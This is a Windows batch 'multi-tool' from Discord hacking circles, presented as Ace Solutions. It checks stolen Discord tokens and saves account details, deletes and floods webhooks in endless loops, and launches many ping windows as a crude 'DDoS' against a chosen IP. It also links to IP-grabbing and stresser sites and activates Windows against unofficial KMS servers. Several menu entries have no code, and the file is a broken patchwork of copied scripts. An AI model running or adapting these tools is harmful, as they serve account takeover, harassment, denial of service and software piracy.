@echo off
color 4
chcp 65001 >nul
timeout 1 >nu1
setlocal enableextensions enabledelayedexpansion
title Ace
:0
echo ░█████╗░░█████╗░███████╗  ░██████╗░█████╗░██╗░░░░░██╗░░░██╗████████╗██╗░█████╗░███╗░░██╗░██████╗
echo ██╔══██╗██╔══██╗██╔════╝  ██╔════╝██╔══██╗██║░░░░░██║░░░██║╚══██╔══╝██║██╔══██╗████╗░██║██╔════╝
echo ███████║██║░░╚═╝█████╗░░  ╚█████╗░██║░░██║██║░░░░░██║░░░██║░░░██║░░░██║██║░░██║██╔██╗██║╚█████╗░
echo ██╔══██║██║░░██╗██╔══╝░░  ░╚═══██╗██║░░██║██║░░░░░██║░░░██║░░░██║░░░██║██║░░██║██║╚████║░╚═══██╗
echo ██║░░██║╚█████╔╝███████╗  ██████╔╝╚█████╔╝███████╗╚██████╔╝░░░██║░░░██║╚█████╔╝██║░╚███║██████╔╝
echo ╚═╝░░╚═╝░╚════╝░╚══════╝  ╚═════╝░░╚════╝░╚══════╝░╚═════╝░░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝╚═════╝░
<nul set /p "=┌─── (user@%username%) "
echo.
<nul set /p "=└─# "
echo Made By Neptune and Zora
echo ╔═══                                       ═══╗       ╔═══                                       ═══╗                                                                                       
echo   1 - Check One token     8 - ServerNuker               15 - WebHookTool                                                
echo   2 - Check tokens        9 - ddos                      16 - Token Spammer                              
echo   3 - Delete webhook      10 - spam Dm                  17 - Password Gen                   
echo   4 - Spam webhook        11 - Zoras tool               18 - ipGeoLookup                  
echo   5 - GitHub              12 - TokenJoiner              19 - breachchecker                  
echo   6 - Discord             13 - windows activation       20 - DoxTool             
echo   7 - Ip Pinger           14 - Token Joiner                                                            
echo ╚═══                                       ═══╝       ╚═══                                       ═══╝                                        
set /p f= Enter Choice Here:
if "%f%" == "19" cls & goto 19
if "%f%" == "18" cls & goto 18
if "%f%" == "17" cls & goto 17
if "%f%" == "15" cls & goto 15
if "%f%" == "14" cls & goto 14
if "%f%" == "13" cls & goto 13
if "%f%" == "11" cls & goto 11
if "%f%" == "10" cls & goto 10
if "%f%" == "9" cls & goto 9
if "%f%" == "8" cls & goto 8
if "%f%" == "7" cls & goto 7
if "%f%" == "6" cls & goto 6
if "%f%" == "5" cls & goto 5
if "%f%" == "4" cls & goto 4
if "%f%" == "3" cls & goto 3
if "%f%" == "0" exit
if "%f%" == "2" cls & goto 2
if "%f%" == "1" (cls & goto 1 
) else (cls & goto 0)

rem Single Token Checker
:1
set /p token="Your token: "
cls
for /F %%I in ('curl --silent -H "Content-Type: application/json" -H "Authorization: %token%" https://discord.com/api/v9/users/@me/library') do set ValidToken=%%I
	if NOT %ValidToken%=={"message": (
		color 2 & echo Token is either valid or locked :/
		curl --silent -H "Content-Type: application/json" -H "Authorization: %token%" https://discordapp.com/api/v9/users/@me >> tokeninfo.json
		echo. >> tokeninfo.json
		echo.
		echo Saved token info in tokeninfo.json
	) else (
		color 4 & echo Token is invalid!
	)

set /P c="Do you want to check another token [Y/N]? "
if /I "%c%" EQU "Y" color 7 & cls & goto 1
if /I "%c%" EQU "N" (
color 4 & cls & goto 0
)
else (
color 4 && cls & goto 0
)

rem Mass Check Tokens | Broken . _.
:2
set /p pathTokens="Path to tokens (*.txt): "
if not exist %pathTokens% cls && echo File not found && timeout 5 && cls & goto 0
for /F "usebackq tokens=*" %%A in ("%pathTokens%") do (
	for /F %%I in ('curl --silent -H "Content-Type: application/json" -H "Authorization: %%A" https://discord.com/api/v9/users/@me/library') do set ValidTokens=%%I
		if NOT "%ValidTokens%"=="{""message"":" (
		echo "[Valid | Locked] %%A"
		curl --silent -H "Content-Type: application/json" -H "Authorization: %%A" https://discordapp.com/api/v9/users/@me >> tokeninfo.json
		echo. >> tokeninfo.json
		) else (
			echo "[Invalid] %%A"
		)
	)
echo Valid token are saved in "tokeninfo.json" (if any).

set /P idk="Do you want to return to main screen [Y/N]? "
if /I "%idk%" EQU "Y" cls & goto 0
if /I "%idk%" EQU "N" cls & goto 2
else cls & goto 0

rem Mass Delete Webhook
:3
echo [SPACE] between each webhook to delete multiple webhooks.
set /p input="Enter webhook: "
CURL -X "DELETE" %input%

set /P idk="Do you want to return to main screen [Y/N]? "
if /I "%idk%" EQU "Y" cls & goto 0
if /I "%idk%" EQU "N" cls & goto 3
else color 4 & cls & goto 0

rem Webhook Spammer
:4
set /p webhook="Enter Webhook: "
cls
set /p username="Enter Username: "
cls
set /p message="Enter Message: "
cls
set /p amount="Enter amount of times to spam: [x = Unlimited] "
rem No Limit Spammer
if "%amount%"=="x" (
:UnlimitedSpam
curl -d "content=%message%" -d "username=%username%" -X POST %webhook%
goto UnlimitedSpam
)
for /l %%a in (1, 1, %amount%) do (
curl -d "content=%message%" -d "username=%username%" -X POST %webhook%
cls
echo Message sent %%a times
)
echo.

set /P idk=Do you want to return to main screen [Y/N]? 
if /I "%idk%" EQU "Y" cls & goto 0
if /I "%idk%" EQU "N" cls & goto 4
else cls & goto 0

rem Open GitHub
:5
echo Opening GitHub...
start "" "https://github.com/Kpqz"


rem Open Discord
:6
echo Opening discord
start "" "https://discord.gg/Qk89QudH"    


:7
echo ░█████╗░░█████╗░███████╗░░░░██████╗░░██████╗░
echo ██╔══██╗██╔══██╗██╔════╝░░░██╔════╝░██╔════╝░
echo ███████║██║░░╚═╝█████╗░░░░░██║░░██╗░██║░░██╗░
echo ██║░░██║╚█████╔╝███████╗██╗╚██████╔╝╚██████╔╝
echo ╚═╝░░╚═╝░╚════╝░╚══════╝╚═╝░╚═════╝░░╚═════╝░
echo Hello Enter the Ip you want to Ping bellow
                                                 

set /p IP= Ip :
:rainbow
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...)
ping -t 2 0 10 127.0.0.1 >nul

color a
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...)
ping -t 2 0 10 127.0.0.1 >nul
color 02
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...) 
ping -t 2 0 10 127.0.0.1 >nul
color 03
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...) 
ping -t 2 0 10 127.0.0.1 >nul
color 04
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...)
ping -t 2 0 10 127.0.0.1 >nul
color 05
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...) 
ping -t 2 0 10 127.0.0.1 >nul
color 06
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...) 
ping -t 2 0 10 127.0.0.1 >nul
color 07
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...) 
ping -t 2 0 10 127.0.0.1 >nul
color 08
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...) 
ping -t 2 0 10 127.0.0.1 >nul
color 09
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...)
ping -t 2 0 10 127.0.0.1 >nul
color 0a
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...)
ping -t 2 0 10 127.0.0.1 >nul
color 0b
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...) 
ping -t 2 0 10 127.0.0.1 >nul
color 0c
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...) 
ping -t 2 0 10 127.0.0.1 >nul
color 0d
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...)
ping -t 2 0 10 127.0.0.1 >nul
color 0e
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...)
ping -t 2 0 10 127.0.0.1 >nul
color 0f
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...)
ping -t 2 0 10 127.0.0.1 >nul
goto rainbow





:8
echo ░█████╗░░█████╗░███████╗░░░░██████╗░░██████╗░
echo ██╔══██╗██╔══██╗██╔════╝░░░██╔════╝░██╔════╝░
echo ███████║██║░░╚═╝█████╗░░░░░██║░░██╗░██║░░██╗░
echo ██║░░██║╚█████╔╝███████╗██╗╚██████╔╝╚██████╔╝
echo ╚═╝░░╚═╝░╚════╝░╚══════╝╚═╝░╚═════╝░░╚═════╝░
set /p id=channel id:
set /p token=enter in token:
set /p msg=message to send:
set /p lor3=do u want to do a loop or send it once?
if %lor3% == loop goto b
if %lor3% == once goto g






:9
mode CON: cols=89 LINES=22
title DDoS - By Batcher                                                                                                          

set "DIR=C:\Users\%username%\AppData\Local\Temp\DDoS"

if exist %DIR% goto skipmd
md %DIR%

:skipmd
cd %DIR%
goto init
color a
:start
set "o= "
DEL /F /Q /S *.bat *.dat
color a
@echo off
cls 
echo ░█████╗░░█████╗░███████╗░░░░██████╗░░██████╗░
echo ██╔══██╗██╔══██╗██╔════╝░░░██╔════╝░██╔════╝░
echo ███████║██║░░╚═╝█████╗░░░░░██║░░██╗░██║░░██╗░
echo ██║░░██║╚█████╔╝███████╗██╗╚██████╔╝╚██████╔╝
echo ╚═╝░░╚═╝░╚════╝░╚══════╝╚═╝░╚═════╝░░╚═════╝░
echo made by https://github.com/Kpqz
call :color 0 " "
call :color 2f "Type"
call :color a " "Home"  "
call :color f "---- "
call :color a "To DDoS The Network That You're Connected To With 100Gbs     "    
call :color cf "[Website]" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "List"  "
call :color f "---- "
call :color a "To See The Recent IP's You've Entered" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Skype" "
call :color f "---- "
call :color a "To Get Someone's IP With Skype                               "
call :color cf "[Website]" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Server "
call :color f " ---- "
call :color a "To Get A Website's IP" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Track" "
call :color f "---- "
call :color a "To Track Someone's IP                                        "
call :color cf "[Website]" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Help" "
call :color f " ---- "
call :color a "For Help Page                                        " & echo.
echo.
set /p ip= Choice / IP to target:
if %ip%==Skype goto get
if %ip%==skype goto get
if %ip%==SKYPE goto get
if %ip%==Track goto track
if %ip%==track goto track
if %ip%==TRACK goto track
if %ip%==Server goto server
if %ip%==server goto server
if %ip%==SERVER goto server
if %ip%==LIST goto list
if %ip%==list goto list
if %ip%==List goto list
if %ip%==HOME goto home
if %ip%==home goto home
if %ip%==Home goto home
if %ip%==HELP goto help
if %ip%==help goto help
if %ip%==Help goto help

call :color e "                                    Validating IP.." & echo.
ping %ip% -l 32 -t -n 1 >> %DIR%\text.dat -n 1
>nul find "Please check the name and try again." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip2
)
:validip2
>nul find "Destination host unreachable." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip3
)
:validip3
>nul find "Request timed out." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip4
)
:validip4
>nul find "PING: transmit failed. General failure." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip
)

:validip
echo.       >> %DIR%\history.log
echo  %date%             IP: %ip%   >> %DIR%\history.log
call :color f "                                   "
call :color a0 " - IP is Valid - " & echo.
call :color 0 " "
call :color 2f "Package:"
call :color 0a " 32 - 15000                                               "
call :color 2f "The Bigger The Better"
call :color 0a "                                                                                             "
call :color 9f "F) Detect Package"
call :color a "                                                               E) Back" & echo.
echo.
set /p package= Package: 
if %package%==f goto find
if %package%==F goto find
if %package%==e goto start
if %package%==E goto start
if %package%==%package% goto pack

:pack
echo exit >> %DIR%\info.bat
echo title DDoS Assistance     >> %DIR%\DDoS-Assistance.bat
echo ping %ip% -t -l %package% >>%DIR%\DDoS-Assistance.bat
set "launch=1"

:ddoslauncher
start /min %DIR%\DDoS-Assistance.bat
set /a launch=%launch% + 1
if %launch%==10 goto lmao
goto ddoslauncher


:server
color f
cls
echo.
call :color 28 "   If You Have A Light"
call :color 28 "                                                            E) Back "
call :color 28 "   Speed Network You Can                                                            "  
call :color 28 "   Take Down A Website                                                              " 
call :color 28 "   If Not Then You Will                                                             " 
call :color 28 "   Have No Use Of This Feature                                                      " 
echo.
set /p trace=url: 
if %trace%==e goto start
if "%trace%"=="%trace%" goto trace

:trace
color a
tracert %trace%
echo.
echo    -- IP Over This Text --
echo     Copy It If You Want It
echo.
pause
goto start


:help
echo.
call :color a " " 
call :color cf "[+]" 
call :color a " How To Target An Ip" & echo.
call :color b "                     Enter The Ip You Want To DDoS In The Area" & echo.
echo                               "Choice / IP to target:" 
echo.
call :color a " Press "
call :color e "Enter"
call :color a " To Return
set /p nul=
goto start


:home
start https://stressboss.net/test.php
goto start

:get
start http://mostwantedhf.info
goto start

:track
start http://www.ip-tracker.org/
goto start

:lmao
cls
echo.
ping %IP% -t -l %package% 
exit


:list
cls
if exist %DIR%\history.log type %DIR%\history.log
echo.
echo.
echo  C)Clear                  E)Back
echo.
echo.
set /p ip=
if %ip%==c goto clear
if %ip%==e goto start
:clear
del %DIR%\history.log
goto start


:find
cls
set /a package=11000
echo title Package Detector     >> %DIR%\Package-Detector.bat
echo :beginning                 >> %DIR%\Package-Detector.bat
echo if exist %DIR%\info.bat call %DIR%\info.bat >> %DIR%\Package-Detector.bat
echo goto beginning             >> %DIR%\Package-Detector.bat
set "launch=1"


:launcher
start /min %DIR%\Package-Detector.bat
set /a launch=%launch% + 1
if %launch%==12 goto resetfind
goto launcher


:resetfind
if exist %DIR%\info.bat del %DIR%\info.bat
set /a package=%package% - 1000
if %package%==0 goto invalidip
echo.
echo  Testing Package: %package%
echo ping %ip% -l %package% -t -n 1 >> %DIR%\info.bat
if exist %DIR%\text.dat del %DIR%\text.dat
ping %ip% -l %package% -t -n 2 >> %DIR%\text.dat -n 2
>nul find "Request timed out." %DIR%\text.dat && (
  goto resetfind
) || (
  goto pack
)


:invalidip
call :color c "                                 - IP Does Not Exist -" & echo.
ping localhost -n 2 >NUL
goto start

:init
setlocal EnableDelayedExpansion
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set "DEL=%%a"
)
<nul> X set /p ".=."
goto start


:color
set "param=^%~2" !
set "param=!param:"=\"!"
findstr /p /A:%1 "." "!param!\..\X" nul
<nul set /p ".=%DEL%%DEL%%DEL%%DEL%%DEL%%DEL%%DEL%"





:11
@echo off
chcp 65001 >nu1
:login
title Zora Multi tool
timeout 1 >nu1
color 1


echo ███████╗░█████╗░██████╗░░█████╗░
echo ╚════██║██╔══██╗██╔══██╗██╔══██╗
echo ░░███╔═╝██║░░██║██████╔╝███████║
echo ███████╗╚█████╔╝██║░░██║██║░░██║
echo ╚══════╝░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝
echo.
echo User:Zora Password:Zora
set /p user=Username:
echo.
set /p pass=Password:
if %user% == Zora if %pass% == Zora goto main
cls
echo ERROR CODE 1, PASSWORD OR USERNAME IS INCORRECT
timeout 3 >nu1
goto login
:main
cls
title Zora Multi Tool [By: Zora]
color A
echo.

echo ███████╗░█████╗░██████╗░░█████╗░
echo ╚════██║██╔══██╗██╔══██╗██╔══██╗
echo ░░███╔═╝██║░░██║██████╔╝███████║
echo ██╔══╝░░██║░░██║██╔══██╗██╔══██║
echo ███████╗╚█████╔╝██║░░██║██║░░██║
echo ╚══════╝░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝
echo.
echo 					     Created by Zora
echo 					  https://discord.gg/Qk89QudH
echo.
echo					     	     ╔═══════════════════════╗
echo					     	     ║   [1] Pinger          ║
echo					     	     ║   [2] Information     ║
echo					     	     ╚═══════════════════════╝
echo.
echo.
set /p toolcmds=Choose A Tool (Number):
if %toolcmds% == 1 goto pinger
if %toolcmds% == 2 goto information
cls
echo ERROR CODE 2, WRONG COMMAND/NUMBER 

:pinger
cls
title IP Pinger [By: Zora and Neptune]
color 4
echo -----------------------------------
echo -     CTRL+C TO STOP PINGING    -
echo -----------------------------------
timeout 3 >nu1
cls
set /p IP=Enter IP=
color 2
:top
PING -n 1 %IP% | FIND "TTL="
title ::Pinging! %IP%
IF ERRORLEVEL 1 (echo %IP% [SLAMMED])
set /a num=2
color %num%
ping -t 2 0 10 127.0.0.1 >nul
GoTo top

:information
cls
title Information [By: Neptune]
echo.
echo ::::::::::: ::::    ::: :::::::::: ::::::::  
echo     :+:     :+:+:   :+: :+:       :+:    :+: 
echo     +:+     :+:+:+  +:+ +:+       +:+    +:+ 
echo     +#+     +#+ +:+ +#+ :#::+::#  +#+    +:+ 
echo     +#+     +#+  +#+#+# +#+       +#+    +#+ 
echo     #+#     #+#   #+#+# #+#       #+#    #+# 
echo ########### ###    #### ###        ########  
echo.
echo	This Project was made with love
echo 	Official Discord:Kpqz
echo		 https://discord.gg/Qk89QudH
echo.
echo Skids Will say they own This But They DONT
echo           Press Enter to Exit
color 9
pause                         






:13
@echo off
title Windows 10 ALL version activator&cls&echo ************************************&echo Supported products:&echo - Windows 10 Home&echo - Windows 10 Professional&echo - Windows 10 Enterprise, Enterprise LTSB&echo - Windows 10 Education&echo.&echo.&echo ************************************ &echo Windows 10 activation...
cscript //nologo c:\windows\system32\slmgr.vbs /ipk TX9XD-98N7V-6WMQ6-BX7FG-H8Q99 >nul
cscript //nologo c:\windows\system32\slmgr.vbs /ipk 3KHY7-WNT83-DGQKR-F7HPR-844BM >nul
cscript //nologo c:\windows\system32\slmgr.vbs /ipk 7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH >nul
cscript //nologo c:\windows\system32\slmgr.vbs /ipk PVMJN-6DFY6-9CCP6-7BKTT-D3WVR >nul
cscript //nologo c:\windows\system32\slmgr.vbs /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX >nul
cscript //nologo c:\windows\system32\slmgr.vbs /ipk MH37W-N47XK-V7XM9-C7227-GCQG9 >nul
cscript //nologo c:\windows\system32\slmgr.vbs /ipk NW6C2-QMPVW-D7KKK-3GKT6-VCFB2 >nul
cscript //nologo c:\windows\system32\slmgr.vbs /ipk NW6C2-QMPVW-D7KKK-3GKT6-VCFB2 >nul
cscript //nologo c:\windows\system32\slmgr.vbs /ipk 2WH4N-8QGBV-H22JP-CT43Q-MDWWJ >nul
cscript //nologo c:\windows\system32\slmgr.vbs /ipk NPPR9-FWDCX-D2C8J-H872K-2YT43 >nul
cscript //nologo c:\windows\system32\slmgr.vbs /ipk DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4 >nul
cscript //nologo c:\windows\system32\slmgr.vbs /ipk WNMTR-4C88C-JK8YV-HQ7T2-76DF9 >nul
cscript //nologo c:\windows\system32\slmgr.vbs /ipk 2F77B-TNFGY-69QQF-B8YKP-D69TJ >nul
echo ************************************ &echo.&echo.&set i=1
:server
if %i%==1 set KMS_Sev=kms8.msguides.com
if %i%==2 set KMS_Sev=NextLevel.uk.to
if %i%==3 set KMS_Sev=GuangPeng.uk.to
if %i%==4 set KMS_Sev=AlwaysSmile.uk.to
if %i%==5 set KMS_Sev=kms.chinancce.com 
if %i%==6 set KMS_Sev=kms.shuax.com
if %i%==7 exit
cscript //nologo c:\windows\system32\slmgr.vbs /skms %KMS_Sev% >nul
cscript //nologo c:\windows\system32\slmgr.vbs /ato | find /i "successfully" && (echo ************************************ & echo. & choice /n /c YN /m "Do you want to restart your PC now [Y,N]?" & if errorlevel 2 exit) || (echo The connection to the server failed! Trying to connect to another one... & echo Please wait... & echo. & echo. & set /a i+=1 & goto server)
shutdown.exe /r /t 00                 



:15
@echo off
color B
:Main
cls
echo Made By Neptune
set /p option= Would You Like To Check 1 Or 2 Webhooks:
if %option% == 1 goto checker
if %option% == 2 goto checkers
echo Wrong choice
cls
goto main

:checkers
set /p check= Enter Your 1st Webhook Url:
curl %check%
pause
cls
set /p check= Enter Your 2nd Webhook Url:
curl %check%
pause 
cls
goto checks

:checks 
set /p input= Is Webhook Valid Y/N:
if %input% == Y goto deleter
if %input% == N goto checkers
if %input% == y goto deleter
if %input% == n goto checkers
echo Wrong choice 
cls
goto checks

:check
set /p input= Is Webhook Valid Y/N:
if %input% == Y goto deleter
if %input% == N goto checker
if %input% == y goto deleter
if %input% == n goto checker
echo Wrong choice 
cls
goto check

:checker
cls
echo Made By Jose
set /p check= Enter Webhook To Check:
CURL %check%
pause
cls
goto check
:check
set /p input= Is Webhook Valid Y/N:
if %input% == Y goto deleter
if %input% == N goto checker
if %input% == y goto deleter 
if %input% == n goto checker
echo Wrong choice 
cls
goto check

:deleter
set /p choice= Would You Like To Delete 1 Webhook or 2 Webhook:
if %choice% == 1 goto delete
if %choice% == 2 goto deleters
echo Wrong choice 
cls
goto deleter

:delete
cls
set /p url= Enter Your Webhook To Delete:
CURL -X DELETE %url%
set /p input= Webhook Sucessfully Deleted
cls
goto exit

:deleters
cls
set /p url= Enter Your 1st Webhook Url:
cls
CURL -X DELETE %url%
set /p url= Enter Your 2nd Webhook Url:
cls
CURL -X DELETE %url%
set /p input=All Webhooks SucessFully Deleted
cls
goto exit

:exit
set /p exit=Would You Like To Exit Y/N:
if %exit% == Y goto exits
if %exit% == N goto Main 
if %exit% == y goto exits
if %exit% == n goto Main 
echo Wrong choice 
cls
goto exit

:exits
exit



:17
:password_generator
cls
echo    Password Generator

set /p "length=Enter desired length of password: "

setlocal enabledelayedexpansion
set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_-+=[]{}|;:,.<>/?"
set "password="

for /l %%i in (1,1,%length%) do (
    set /a idx=!random! %% 87
    for /l %%j in (!idx!,1,!idx!) do (
        set "char=!chars:~%%j,1!"
        set "password=!password!!char!"
    )
)

echo Generated Password: %password%
pause
goto 0





:19
cls
color B
echo                       ┌───────┐   ╔════════════════════╗
echo                       │ ════ o│   ║                    ║
echo                       ├───────┤   ║                    ║
echo    ╔══════════════╗   │[■■■■]o│   ║                    ║
echo    ║              ║   ├───────┤   ║                    ║
echo    ║              ║   │       │   ╚════════╤══╤══════o═╝
echo    ║              ║   │       │─────┘  ____│__│____
echo    ║              ║   │       │─┐     /____________\
echo    ╚══════════════╝   └───────┘ │ ________________
echo   /::::::::::::::::\      │     └/::::::::::::::::\
echo  /:::::════════:::::\    /T\    /:::::════════:::::\
echo  ════════════════════    \_/    ════════════════════

set /p password=Enter a password to check for breaches:
for /f %%i in ('powershell -NoProfile -Command "$password = '%password%'; $sha1 = [System.Security.Cryptography.SHA1]::Create(); $hash = $sha1.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($password)); $hashedPassword = -join ($hash | ForEach-Object { $_.ToString('x2') }).ToUpper(); Write-Output $hashedPassword"') do set hashedPassword=%%i
set prefix=%hashedPassword:~0,5%
set suffix=%hashedPassword:~5%
powershell -NoProfile -Command "$prefix = '%prefix%'; $suffix = '%suffix%'; $url = 'https://api.pwnedpasswords.com/range/' + $prefix; $response = (Invoke-WebRequest -Uri $url).Content; if ($response -match $suffix) { Write-Host 'This password has been breached. It is not secure.' } else { Write-Host 'This password has not been breached. It is secure.' }"
pause
end
cls & goto 0



:18
:ipGeoLookup
cls
echo [37m╔═══════════════════════════════╗
echo ║    [94m╦[37m╔═╗  [94m╦  [37m╔═╗[94m╔═╗[37m╦╔═[94m╦ ╦[37m╔═╗[37m   ║
echo ║    [94m║[37m╠═╝  [94m║  [37m║ ║[94m║ ║[37m╠╩╗[94m║ ║[37m╠═╝[37m   ║
echo ║    [94m╩[37m╩    [94m╩═╝[37m╚═╝[94m╚═╝[37m╩ ╩[94m╚═╝[37m╩  [37m   ║
echo [37m╚═══════════════════════════════╝  
set /p "ip=[94mE[37mn[94mt[37me[94mr [37ma[94mn [37mI[94mP [37ma[97m[37md[97md[37mre[97ms[37ms: "             
echo.
curl -s ipinfo.io/%ip% | findstr /R /C:"\"city\":" /C:"\"postal\":" /C:"\"country\":" /C:"\"loc\":" /C:"\"timezone\":"
echo.
echo [94m╚═════════════════════════════════════════════
pause
end
cls & goto 0